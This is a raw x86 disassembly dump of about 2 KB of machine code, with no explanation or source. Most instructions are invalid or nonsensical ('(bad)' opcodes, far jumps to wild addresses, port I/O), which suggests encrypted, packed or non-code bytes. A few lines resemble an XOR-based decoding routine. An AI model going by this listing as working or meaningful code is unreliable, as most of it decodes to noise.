  4020aa:	loop   0x402071
  4020ac:	dec    edx
  4020ad:	cmp    al,0x42
  4020af:	outs   dx,BYTE PTR ds:[si]
  4020b1:	sahf   
  4020b2:	loopne 0x4020b0
  4020b4:	dec    esp
  4020b5:	(bad)  
  4020b6:	adc    esp,DWORD PTR [edi]
  4020b8:	cmp    edx,DWORD PTR [edi-0x5686523c]
  4020be:	jge    0x4020a9
  4020c0:	lea    ebx,[edi]
  4020c2:	or     eax,0xe7656a31
  4020c7:	and    cl,cl
  4020c9:	xor    al,0xed
  4020cb:	add    eax,0x6343bfce
  4020d0:	xchg   esp,eax
  4020d1:	jne    0x4020d9
  4020d3:	es or  eax,0x62c7c429
  4020d9:	mov    ebx,0xab07436a
  4020de:	jae    0x40211c
  4020e0:	in     al,dx
  4020e1:	and    bl,BYTE PTR [edi-0x63ffdadf]
  4020e7:	sub    al,0xf5
  4020e9:	mov    dl,0xf9
  4020eb:	ror    BYTE PTR [esi-0x63],1
  4020ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020ef:	jmp    0xda857a39
  4020f4:	xor    esp,DWORD PTR [ebp+ebx*2+0x5748435]
  4020fb:	sbb    ecx,eax
  4020fd:	sub    DWORD PTR [ecx-0x5c],0x52
  402101:	dec    esp
  402102:	scas   eax,DWORD PTR es:[edi]
  402103:	sbb    esp,esi
  402105:	jb     0x4020a7
  402107:	gs jg  0x4020f7
  40210a:	jne    0x4020f6
  40210c:	lahf   
  40210d:	sbb    ch,bh
  40210f:	xor    al,0x19
  402111:	rol    esi,1
  402113:	(bad)  
  402114:	int3   
  402115:	xchg   ebp,eax
  402116:	jl     0x4020b3
  402118:	daa    
  402119:	ins    BYTE PTR es:[edi],dx
  40211a:	jo     0x40210f
  40211c:	retf   
  40211d:	and    DWORD PTR [edx+0x6fe6e4f9],0x48
  402124:	inc    esi
  402125:	in     eax,0xa1
  402127:	test   al,0xbe
  402129:	mov    DWORD PTR [edi+0x21a68799],esp
  40212f:	ins    DWORD PTR es:[edi],dx
  402130:	ja     0x402106
  402132:	(bad)  
  402134:	stos   BYTE PTR es:[edi],al
  402135:	sbb    ch,BYTE PTR [eax-0xe]
  402138:	pop    eax
  402139:	mov    ch,0x99
  40213b:	and    DWORD PTR [esi+ebx*2+0x294323ed],edx
  402142:	mov    eax,ds:0xb517c9eb
  402147:	sub    esp,DWORD PTR [ebx+0x67]
  40214a:	(bad)  
  40214d:	xchg   esi,eax
  40214e:	xlat   BYTE PTR ds:[ebx]
  40214f:	push   es
  402150:	in     al,dx
  402151:	xchg   edx,eax
  402152:	pop    ebx
  402153:	jge    0x402139
  402155:	ja     0x4021b3
  402157:	jmp    0x402107
  402159:	add    BYTE PTR [edx-0x80],0xd2
  40215d:	les    ecx,FWORD PTR [edx+edi*8-0x3068683b]
  402164:	xchg   edx,eax
  402165:	fs mov ebx,edi
  402168:	adc    ah,bh
  40216a:	pusha  
  40216b:	mov    eax,0xcfd5ddc9
  402170:	sub    al,0xbf
  402172:	pop    ss
  402173:	dec    edx
  402174:	and    DWORD PTR [ecx-0x1c62dca9],edi
  40217a:	jbe    0x4021de
  40217c:	les    eax,FWORD PTR [eax-0x4d]
  40217f:	sub    edx,edx
  402181:	test   DWORD PTR [ebp-0x4f396025],edi
  402187:	cld    
  402188:	inc    esp
  402189:	bound  ebx,QWORD PTR [ebx]
  40218b:	mov    WORD PTR [edx+0x2efd5163],cs
  402191:	fwait
  402192:	outs   dx,DWORD PTR ds:[esi]
  402193:	(bad)  
  402194:	push   ss
  402195:	aas    
  402196:	cwde   
  402197:	imul   ebp,DWORD PTR [ebp-0x7dd09375],0x3249a95b
  4021a1:	fldcw  WORD PTR [edx+esi*4]
  4021a4:	jns    0x402172
  4021a6:	cs inc esp
  4021a8:	adc    ebp,DWORD PTR [edi-0x569a505f]
  4021ae:	mov    esi,0x91c98b00
  4021b3:	adc    BYTE PTR [edx],bl
  4021b5:	ficomp WORD PTR [ebx]
  4021b7:	(bad)  
  4021b8:	sbb    eax,0x65ee5397
  4021bd:	or     BYTE PTR [esi+0x4bfe9d1d],bl
  4021c3:	jb     0x40216b
  4021c5:	xchg   DWORD PTR [ebx-0x4c],ebx
  4021c8:	in     eax,dx
  4021c9:	inc    esp
  4021ca:	test   eax,0x3a39de32
  4021cf:	cmp    al,BYTE PTR [ecx+0x13]
  4021d2:	add    al,0xc7
  4021d4:	sub    DWORD PTR ds:[ebp+0x61],esp
  4021d8:	xchg   esp,esi
  4021da:	rol    BYTE PTR [edi+0x28],0xf3
  4021de:	leave  
  4021df:	xor    esp,DWORD PTR [ebp+esi*8+0x2e8b3950]
  4021e6:	mov    al,ds:0xd3a63fb7
  4021eb:	stc    
  4021ec:	(bad)  
  4021ed:	pop    ebp
  4021ee:	call   FWORD PTR [ecx]
  4021f0:	aaa    
  4021f1:	mov    al,BYTE PTR ds:0xa46d31e1
  4021f7:	popf   
  4021f8:	xchg   esi,eax
  4021f9:	sbb    eax,0xa277a70c
  4021fe:	mov    ecx,0x52a812d1
  402203:	or     esi,DWORD PTR [esi]
  402205:	ins    DWORD PTR es:[edi],dx
  402206:	or     DWORD PTR [ebp-0x45],esi
  402209:	ds xchg ebp,eax
  40220b:	or     esi,DWORD PTR [ecx-0x22770ae4]
  402211:	push   esi
  402212:	xchg   edx,eax
  402213:	out    0x8f,al
  402215:	test   al,dl
  402217:	outs   dx,DWORD PTR ds:[esi]
  402218:	mov    ebp,0xfd669a92
  40221d:	jg     0x402219
  40221f:	js     0x402270
  402221:	stos   BYTE PTR es:[edi],al
  402222:	div    BYTE PTR [ebx+0x6cc9d4b]
  402228:	dec    eax
  402229:	jae    0x40223b
  40222b:	repnz (bad) 
  40222d:	lods   eax,DWORD PTR ds:[esi]
  40222e:	lahf   
  40222f:	(bad)  
  402231:	push   edi
  402232:	push   es
  402233:	and    al,0xe8
  402235:	dec    esp
  402236:	pop    esi
  402237:	and    BYTE PTR [eax+0x7f],ch
  40223a:	scas   eax,DWORD PTR es:[edi]
  40223b:	push   ds
  40223c:	sbb    eax,DWORD PTR [eax+0x13bc139c]
  402242:	(bad)  
  402243:	cmp    BYTE PTR [edi-0x292707ab],bh
  402249:	xor    al,0x4d
  40224b:	or     dh,BYTE PTR [eax+0x2f]
  40224e:	mov    bh,0x54
  402250:	test   DWORD PTR [eax+0x48],0x176d3ff6
  402257:	add    DWORD PTR ds:0xf01f6d88,ebp
  40225d:	xor    esi,DWORD PTR [esi+0x50203a42]
  402263:	jbe    0x402254
  402265:	fcom   DWORD PTR [esi]
  402267:	stc    
  402268:	inc    esi
  402269:	loopne 0x40222e
  40226b:	mov    cl,0x4d
  40226d:	mov    ch,0x3b
  40226f:	js     0x4022bf
  402271:	imul   edx,eax,0xff159e05
  402277:	pop    ecx
  402278:	sub    al,0xe0
  40227a:	hlt    
  40227b:	cmp    ch,dh
  40227d:	ret    0x9de3
  402280:	rol    cl,cl
  402282:	mov    esp,eax
  402284:	sub    al,0x7c
  402286:	stos   BYTE PTR es:[edi],al
  402287:	(bad)  
  402288:	jg     0x402234
  40228a:	test   esi,ebx
  40228c:	(bad)  
  40228d:	cmp    bl,dl
  40228f:	sbb    DWORD PTR gs:[edx+0x6c4555e0],esp
  402296:	dec    edx
  402297:	xchg   ecx,eax
  402298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402299:	xchg   edx,eax
  40229a:	jbe    0x402255
  40229c:	test   al,0xbb
  40229e:	je     0x4022e5
  4022a0:	dec    esp
  4022a1:	aaa    
  4022a2:	sbb    ebx,DWORD PTR [ecx+ebp*8]
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xb1682c5b
  4022e1:	enter  0x6023,0x4
  4022e5:	or     DWORD PTR [eax+0x78],edi
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402365
  4022ed:	sub    al,0x5c
  4022ef:	shl    BYTE PTR ds:[edx-0x5b],cl
  4022f3:	loopne 0x402352
  4022f5:	inc    esp
  4022f6:	stos   BYTE PTR es:[edi],al
  4022f7:	imul   edi,DWORD PTR [ebx],0xff7e6d49
  4022fd:	cmp    ecx,edi
  4022ff:	pop    ecx
  402300:	icebp  
  402301:	adc    al,0xb9
  402303:	mov    ch,0x46
  402305:	sbb    al,0xf7
  402307:	loop   0x402305
  402309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40230a:	add    eax,0x9c8bf4a4
  40230f:	adc    eax,0x5ccc58bc
  402314:	jmp    0xb2a4:0x47ffe94c
  40231b:	sub    ah,BYTE PTR fs:[edx]
  40231e:	retf   
  40231f:	ret    0x45e5
  402322:	jmp    0xc6ef:0x8c947b20
  402329:	mov    bl,0xcd
  40232b:	push   es
  40232c:	mov    edx,DWORD PTR [edi-0x79]
  40232f:	loope  0x402396
  402331:	fcomp  QWORD PTR [esi-0x24]
  402334:	mov    WORD PTR [eax-0xbea18e7],cs
  40233a:	mov    es,WORD PTR [edx-0x1d1510ef]
  402340:	mov    al,0x6c
  402342:	test   al,0xa1
  402344:	iret   
  402345:	mov    dh,0x29
  402347:	push   es
  402348:	and    ecx,DWORD PTR [edx+ecx*1]
  40234b:	mov    DWORD PTR [edx],edx
  40234d:	(bad)  
  40234e:	daa    
  40234f:	cld    
  402350:	dec    esi
  402351:	cld    
  402352:	dec    ebp
  402353:	mov    edi,0x487e8ee5
  402358:	ja     0x4023af
  40235a:	cdq    
  40235b:	pop    esi
  40235c:	cwde   
  40235d:	ret    0x40c6
  402360:	nop
  402361:	mov    cl,0xe3
  402363:	(bad)  
  402364:	mov    ebx,0x5dd06238
  402369:	inc    esi
  40236a:	cdq    
  40236b:	test   DWORD PTR [edx+0x58],ebx
  40236e:	aad    0xa7
  402370:	mov    ebp,0x12e94a70
  402375:	push   ss
  402376:	adc    eax,0x5a2f799b
  40237b:	cmp    DWORD PTR ds:0x12c9a7c2,edx
  402381:	sbb    esi,edx
  402383:	retf   
  402384:	and    cl,BYTE PTR [edi-0x7e]
  402387:	jmp    0x4023a9
  402389:	jo     0x4023f7
  40238b:	pop    ebp
  40238c:	dec    eax
  40238d:	mov    WORD PTR [edx+0x59],es
  402390:	mov    eax,0x68c6b207
  402395:	push   ss
  402396:	fld    TBYTE PTR [esi+ecx*2]
  402399:	pop    esi
  40239a:	(bad)  
  40239b:	(bad)  
  40239c:	popa   
  40239d:	pop    esi
  40239e:	mov    eax,0xa0e74324
  4023a3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4023a5:	shl    DWORD PTR [eax-0x37acfe62],cl
  4023ab:	shr    BYTE PTR [eax],0x34
  4023ae:	test   esp,ecx
  4023b0:	(bad)  
  4023b1:	call   0x5d98e75d
  4023b6:	aam    0x1f
  4023b8:	mov    ah,0x4b
  4023ba:	nop
  4023bb:	fnsave ds:0xe5d0fb9b
  4023c1:	sub    al,0x68
  4023c3:	mov    ebx,cs
  4023c5:	(bad)  [eax]
  4023c7:	loop   0x4023b0
  4023c9:	push   es
  4023ca:	cli    
  4023cb:	jae    0x4023cc
  4023cd:	fidivr WORD PTR [eax-0x7946dff3]
  4023d3:	push   es
  4023d4:	mov    eax,DWORD PTR [ecx-0x2be297e4]
  4023da:	addr16 pop es
  4023dc:	push   edx
  4023dd:	sbb    al,0x2a
  4023df:	pop    eax
  4023e0:	mov    ch,0x1a
  4023e2:	iret   
  4023e3:	xlat   BYTE PTR ds:[ebx]
  4023e4:	sahf   
  4023e5:	std    
  4023e6:	enter  0x42f2,0xc7
  4023ea:	or     edi,DWORD PTR [esi-0x23]
  4023ed:	push   esp
  4023ee:	or     ah,BYTE PTR [ebx+ebp*2-0x76]
  4023f2:	or     bh,ah
  4023f4:	sub    eax,DWORD PTR [edi]
  4023f6:	or     al,0x4a
  4023f8:	imul   ecx,esi,0x55a54634
  4023fe:	sbb    edx,0x2a020909
  402404:	mov    edx,0xae329a30
  402409:	imul   edx,DWORD PTR [ebp+0x2],0x1b418218
  402410:	pusha  
  402411:	xor    DWORD PTR [ebx],edx
  402413:	dec    ebp
  402414:	inc    edx
  402415:	leave  
  402416:	je     0x4023a9
  402418:	in     eax,dx
  402419:	mov    bl,0xb4
  40241b:	push   eax
  40241c:	push   0x30bbb01e
  402421:	out    0xe6,al
  402423:	dec    DWORD PTR [eax]
  402425:	push   es
  402426:	loop   0x4023ca
  402428:	cmp    BYTE PTR [eax+0x19],al
  40242b:	fs call 0xd262d749
  402431:	sbb    ecx,DWORD PTR [edx]
  402433:	fisubr WORD PTR [edx+0x6898ef0b]
  402439:	or     BYTE PTR [eax],dl
  40243b:	pusha  
  40243c:	lock inc eax
  40243e:	rcr    BYTE PTR [ebp+eiz*4-0x52],0x48
  402443:	xchg   DWORD PTR [esp+edx*4],edx
  402446:	fadd   QWORD PTR [esi+0x6d]
  402449:	into   
  40244a:	lahf   
  40244b:	jmp    0x2002:0x595c2fde
  402452:	pop    ebp
  402453:	fadd   st,st(3)
  402455:	cld    
  402456:	fdiv   st(5),st
  402458:	imul   ecx,DWORD PTR [edx],0x1e9e6084
  40245e:	mov    esi,0x9f89efdf
  402463:	int    0xdc
  402465:	or     dl,bh
  402467:	in     al,0x23
  402469:	test   BYTE PTR [ebp+0x4a7da21d],al
  40246f:	je     0x40242c
  402471:	imul   eax,DWORD PTR [edi],0x9116702e
  402477:	int    0x19
  402479:	jmp    0x7828:0xd1c4d80d
  402480:	dec    ebp
  402481:	or     eax,0xca4afc76
  402486:	add    ebx,DWORD PTR [edx]
  402488:	imul   eax,DWORD PTR ds:0x170a38,0xb24376b2
  402492:	(bad)  
  402493:	pusha  
  402494:	loop   0x402444
  402496:	and    BYTE PTR [ebx-0x7f8a9bb7],ch
  40249c:	cli    
  40249d:	xor    al,0x73
  40249f:	sahf   
  4024a0:	or     BYTE PTR [edi],0x55
  4024a3:	loopne 0x4024f6
  4024a5:	mov    cl,0xa4
  4024a7:	out    dx,eax
  4024a8:	ret    
  4024a9:	push   es
  4024aa:	pop    ds
  4024ab:	cmp    ebx,DWORD PTR [edx+0x2f]
  4024ae:	lahf   
  4024af:	add    ecx,DWORD PTR [ebp-0xa]
  4024b2:	push   esp
  4024b3:	js     0x40245e
  4024b5:	stos   DWORD PTR es:[edi],eax
  4024b6:	fst    DWORD PTR [eax]
  4024b8:	mov    ecx,0x83bfe7b4
  4024bd:	(bad)  
  4024be:	dec    DWORD PTR [ebx]
  4024c0:	mov    BYTE PTR [ebp-0x51],bl
  4024c3:	jl     0x402544
  4024c5:	jbe    0x40248c
  4024c7:	mov    edi,0xfae05136
  4024cc:	fdiv   QWORD PTR [eax+0x7777da32]
  4024d2:	shl    DWORD PTR [esi+0x5e],1
  4024d5:	sub    al,0x0
  4024d8:	push   ecx
  4024d9:	ror    eax,cl
  4024db:	add    BYTE PTR [edx],ah
  4024dd:	xchg   DWORD PTR [edx-0x5],esi
  4024e0:	push   esp
  4024e1:	push   0x6c
  4024e3:	clc    
  4024e4:	mov    edx,0x3a45805d
  4024e9:	repnz mov cl,0x38
  4024ec:	adc    BYTE PTR [ebx-0x63],bh
  4024ef:	sbb    DWORD PTR [ecx],esi
  4024f1:	add    al,0x90
  4024f3:	mov    bl,BYTE PTR [ecx+ebx*1+0x4e9b2a9e]
  4024fa:	retf   
  4024fb:	stos   DWORD PTR es:[edi],eax
  4024fc:	stos   BYTE PTR es:[edi],al
  4024fd:	push   ecx
  4024fe:	sub    al,0x16
  402500:	shr    BYTE PTR [eax+0x12a76688],1
  402506:	sub    dl,BYTE PTR [edx-0x1c]
  402509:	imul   DWORD PTR [ebp-0x4fddc671]
  40250f:	sti    
  402510:	ja     0x402552
  402512:	neg    BYTE PTR [edx+0x6]
  402515:	xchg   DWORD PTR [ebp-0x68],esi
  402518:	sub    eax,0xb72303b9
  40251d:	retf   0xac22
  402520:	jg     0x402576
  402522:	retf   
  402523:	es push eax
  402525:	mov    ebx,0x459a951a
  40252a:	repz pop edi
  40252c:	in     al,dx
  40252d:	cmc    
  40252e:	sbb    cl,BYTE PTR [ecx-0x76]
  402531:	lds    bp,DWORD PTR [eax]
  402534:	mov    al,ds:0x35d622f6
  402539:	clc    
  40253a:	cmp    eax,0x1b637a08
  40253f:	xor    al,0x90
  402541:	test   BYTE PTR [esi+0x12],ah
  402544:	je     0x402534
  402546:	add    edx,DWORD PTR [ebp-0x4f76e5bb]
  40254c:	aaa    
  40254d:	adc    BYTE PTR [edi-0x5822405e],ch
  402553:	and    al,0x56
  402555:	mov    eax,0x3d8c581e
  40255a:	mov    esi,DWORD PTR [edx+0x51ad5054]
  402560:	(bad)  
  402561:	jmp    0x2e40:0x595660c8
  402568:	mov    ds:0x5bcbc2b5,eax
  40256d:	or     al,0x39
  40256f:	add    DWORD PTR [edi],ecx
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	ret    
  402594:	imul   edi,ebx,0x42
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x402618
  4025a0:	imul   DWORD PTR [eax+0x82e4065]
  4025a6:	xor    DWORD PTR [eax-0x263f04f6],ecx
  4025ac:	in     eax,0x3c
  4025ae:	mov    ds:0xa4a7eec4,al
  4025b3:	imul   eax,DWORD PTR [ebx-0x4aee2402],0xffffffb3
  4025ba:	push   cs
  4025bb:	dec    ebx
  4025bc:	pop    edx
  4025bd:	sbb    al,0x8b
  4025bf:	inc    ebp
  4025c0:	cmp    BYTE PTR [esp+edx*1-0x1d],dl
  4025c4:	sbb    al,0x44
  4025c6:	xchg   esi,eax
  4025c7:	mov    ebx,0xfe7bf18a
  4025cc:	clc    
  4025cd:	test   DWORD PTR [edx-0x57bb27ff],esi
  4025d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d4:	push   eax
  4025d5:	sub    al,0x4a
  4025d8:	or     al,0x3d
  4025da:	sub    eax,0xc09d38c4
  4025df:	ja     0x402566
  4025e1:	xchg   al,ah
  4025e3:	stos   BYTE PTR es:[edi],al
  4025e4:	arpl   dx,sp
  4025e6:	adc    DWORD PTR [eax],0x1fafae29
  4025ec:	sbb    DWORD PTR [edi],esi
  4025ee:	cli    
  4025ef:	ret    
  4025f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025f1:	ret    0xe21b
  4025f4:	retf   0x7dc0
  4025f7:	gs ins DWORD PTR es:[edi],dx
  4025f9:	inc    ebx
  4025fa:	in     al,dx
  4025fb:	out    dx,eax
  4025fc:	addr16 mov bh,0xff
  4025ff:	mov    cl,0xa7
  402601:	cs or  esp,0xffffffaf
  402605:	jecxz  0x40260f
  402607:	(bad)  
  402608:	fisttp DWORD PTR [ecx-0x5]
  40260b:	and    DWORD PTR [eax+0x40],edi
  40260e:	lock es arpl cx,dx
  402612:	dec    eax
  402614:	data16 (bad) 
  402616:	jmp    0x3417:0x7b818b66
  40261d:	xor    ecx,DWORD PTR [eax]
  40261f:	cmp    al,0xfb
  402621:	jmp    0x40264f
  402623:	repnz xchg esi,eax
  402625:	pop    edx
  402626:	mov    ds:0xd5440307,eax
  40262b:	arpl   di,di
  40262d:	gs pop esi
  40262f:	test   BYTE PTR [edx],0xf0
  402632:	out    dx,al
  402633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402634:	or     DWORD PTR [ebx+0x73],esi
  402637:	out    dx,al
  402638:	jo     0x4025be
  40263a:	sbb    bl,BYTE PTR [eax]
  40263c:	cmp    al,0xef
  40263e:	in     al,0x4c
  402640:	xor    BYTE PTR [ecx-0x6a2dfb0d],cl
  402646:	sbb    DWORD PTR [ebx],esp
  402648:	sub    eax,0x2493417c
  40264d:	xchg   BYTE PTR [ecx+0x3b],cl
  402650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402651:	xchg   ebx,eax
  402652:	pop    ecx
  402653:	repnz jmp 0xd125:0xa637acec
  40265b:	sub    al,0x79
  40265e:	or     cl,BYTE PTR [ecx+eiz*1+0x7a]
  402662:	and    al,0x57
  402664:	ins    DWORD PTR es:[edi],dx
  402665:	jae    0x40263a
  402667:	mov    ds:0x956bc0b,al
  40266c:	sbb    esi,DWORD PTR [ecx-0x2021e215]
  402672:	aam    0xd0
  402674:	repnz ins DWORD PTR es:[edi],dx
  402676:	in     al,dx
  402677:	(bad)  
  402678:	jge    0x4025fc
  40267a:	ins    DWORD PTR es:[edi],dx
  40267b:	or     esi,DWORD PTR [ecx]
  40267d:	fisttp QWORD PTR ds:0xf61bfcb0
  402683:	enter  0xe07c,0x3f
  402687:	or     BYTE PTR [eax+0x5bf85153],bl
  40268d:	lea    ecx,[esi+0x15]
  402690:	pop    edi
  402691:	in     eax,0xe6
  402693:	cmp    BYTE PTR [esi],bl
  402695:	xor    DWORD PTR [esi],edi
  402697:	jge    0x402633
  402699:	fnsave [edx+0x5d]
  40269c:	ret    
  40269d:	sbb    eax,0x2f18ff5
  4026a2:	outs   dx,BYTE PTR ds:[esi]
  4026a3:	sar    DWORD PTR ds:0xd3c1f317,0x87
  4026aa:	ror    bh,0x58
  4026ad:	cmp    ebp,eax
  4026af:	lds    edi,FWORD PTR [ebp+edx*1-0x7237850a]
  4026b6:	out    0xac,eax
  4026b8:	adc    ecx,DWORD PTR [edi-0x2887666f]
  4026be:	mov    esi,0x3ddbf0cb
  4026c3:	sbb    eax,DWORD PTR [ecx+0x44]
  4026c6:	outs   dx,DWORD PTR ds:[esi]
  4026c7:	pop    eax
  4026c8:	sbb    BYTE PTR [ebx],bh
  4026ca:	xlat   BYTE PTR ds:[ebx]
  4026cb:	in     al,0xb3
  4026cd:	addr16 add al,0xb9
  4026d0:	add    ah,bh
  4026d2:	int    0xc2
  4026d4:	stc    
  4026d5:	cmp    dh,BYTE PTR [ebp-0x754e2bb8]
  4026db:	mov    dh,0xd8
  4026dd:	xchg   ebp,eax
  4026de:	lea    edx,[ebp-0x58]
  4026e1:	xchg   ebx,eax
  4026e2:	sti    
  4026e3:	inc    esp
  4026e4:	cmp    ecx,esp
  4026e6:	cmc    
  4026e7:	lock pop edi
  4026e9:	loopne 0x4026df
  4026eb:	test   BYTE PTR [esi+edi*4-0x23],0xce
  4026f0:	fimul  DWORD PTR [edi]
  4026f2:	sbb    al,0x3b
  4026f4:	mov    eax,0xab5bb5e6
  4026f9:	dec    esi
  4026fa:	(bad)  
  4026fb:	jb     0x4026d0
  4026fd:	in     eax,0xe7
  4026ff:	shl    DWORD PTR [ebp-0x5b],1
  402702:	inc    ebx
  402703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402704:	retf   0xca6f
  402707:	addr16 sbb al,0x8c
  40270a:	mov    ds:0xf98022e7,al
  40270f:	xchg   edi,eax
  402710:	sbb    BYTE PTR [edi+0x2e],ah
  402713:	push   ebx
  402714:	jno    0x402705
  402716:	shr    BYTE PTR [edi],1
  402718:	pop    edi
  402719:	std    
  40271a:	mov    dl,0xc2
  40271c:	sbb    DWORD PTR [esi+0x2e],ebp
  40271f:	push   esp
  402720:	ja     0x402798
  402722:	mov    eax,eax
  402724:	jg     0x402758
  402726:	cdq    
  402727:	neg    ebx
  402729:	xor    BYTE PTR [ecx-0x3],bh
  40272c:	adc    al,0x9f
  40272e:	(bad)  
  40272f:	cs pop es
  402731:	mov    edi,0xf4e8d7a8
  402736:	mul    eax
  402738:	xchg   edx,eax
  402739:	sbb    eax,0xb1cc55e7
  40273e:	inc    edx
  40273f:	shl    DWORD PTR [ecx-0x4f6084ea],1
  402745:	in     al,dx
  402746:	rcr    BYTE PTR [edx-0x17b8c80d],cl
  40274c:	dec    edi
  40274d:	icebp  
  40274e:	mov    bl,BYTE PTR [eax+0x4384ded9]
  402754:	imul   esp
  402756:	xor    cl,BYTE PTR [ebx]
  402758:	xchg   esi,eax
  402759:	push   ds
  40275a:	adc    DWORD PTR [esi],ebx
  40275c:	pop    es
  40275d:	cmp    DWORD PTR [edx+0x66b5aa],0xadc92a49
  402767:	mov    esp,0x66a81c9f
  40276c:	not    DWORD PTR [edi+0x5eb842c1]
  402772:	adc    ecx,DWORD PTR [edi-0x32]
  402775:	add    ah,BYTE PTR [esi+0x186c0905]
  40277b:	jne    0x40270d
  40277d:	das    
  40277e:	jge    0x4027b2
  402780:	mov    eax,ds:0xa83267a4
  402785:	xor    BYTE PTR ds:0xc381aff0,cl
  40278b:	mov    ah,BYTE PTR [ebp+0x69]
  40278e:	out    dx,eax
  40278f:	aam    0x21
  402791:	mov    WORD PTR [ebx-0x41742d91],?
  402797:	push   esp
  402798:	xchg   ebp,eax
  402799:	mov    ds:0x113b22a6,eax
  40279e:	mov    ebp,0x44c2dd49
  4027a3:	push   es
  4027a4:	push   eax
  4027a5:	sub    eax,0x32e8e296
  4027aa:	jno    0x40273b
  4027ac:	leave  
  4027ad:	and    BYTE PTR [edx+0x24468383],ah
  4027b3:	dec    ecx
  4027b4:	and    al,0x7a
  4027b6:	or     ecx,DWORD PTR [edi+0x1f]
  4027b9:	rcr    BYTE PTR cs:[edx+0x2c64bb68],1
  4027c0:	arpl   si,bp
  4027c2:	in     al,0x38
  4027c4:	pop    ecx
  4027c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027c6:	mov    gs,edx
  4027c8:	loopne 0x4027e9
  4027ca:	lods   al,BYTE PTR ds:[esi]
  4027cb:	jns    0x402823
  4027cd:	int    0x98
  4027cf:	les    ebp,FWORD PTR [eax]
  4027d1:	mov    ecx,0x60e0d35f
  4027d6:	push   0x4c7e2e2e
  4027db:	xchg   esi,eax
  4027dc:	mov    edi,0x818e00d7
  4027e1:	adc    ebx,DWORD PTR [esi-0x6d997c9c]
  4027e7:	scas   eax,DWORD PTR es:[edi]
  4027e8:	aad    0x25
  4027ea:	jo     0x4027c3
  4027ec:	das    
  4027ed:	or     DWORD PTR [edi],0x39
  4027f0:	xor    ebx,DWORD PTR [ebx-0xbc5f6f]
  4027f6:	int    0x92
  4027f8:	mov    edi,0x61efe72d
  4027fd:	loope  0x402847
  4027ff:	pop    eax
  402800:	out    dx,al
  402801:	sub    bh,BYTE PTR [edi-0x2e]
  402804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402805:	or     ebp,DWORD PTR [esi-0x1dddeb9f]
  40280b:	repz ds repnz repz push cs
  402810:	jp     0x402852
  402812:	dec    ebx
  402813:	rol    BYTE PTR [ebp-0x55],cl
  402816:	pushf  
  402817:	pop    ebp
  402818:	sbb    eax,0x899f0b88
  40281d:	xor    dl,bh
  40281f:	and    BYTE PTR [ecx],cl
  402821:	mov    eax,DWORD PTR [ebp-0x10]
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	dec    esp
  402882:	xor    esp,eax
  402884:	in     al,dx
  402885:	or     BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028d1
  40288e:	sbb    bh,BYTE PTR [edx]
  402890:	mov    ecx,0xf3f3e9f0
  402895:	rol    DWORD PTR [esi+eiz*8-0xd18d6a4],cl
  40289c:	in     eax,dx
  40289d:	push   ebp
  40289e:	ret    
  40289f:	and    eax,0x5fb8dada
  4028a4:	push   0x77007d7f
  4028a9:	xor    al,0x2f
  4028ab:	fwait
  4028ac:	push   ds
  4028ad:	xchg   ecx,eax
  4028ae:	test   edi,esp
  4028b0:	lds    ebp,FWORD PTR [edi-0x13]
  4028b3:	call   0x6104:0xa20369e3
  4028ba:	loop   0x4028a8
  4028bc:	arpl   WORD PTR [esi+ebx*4],dx
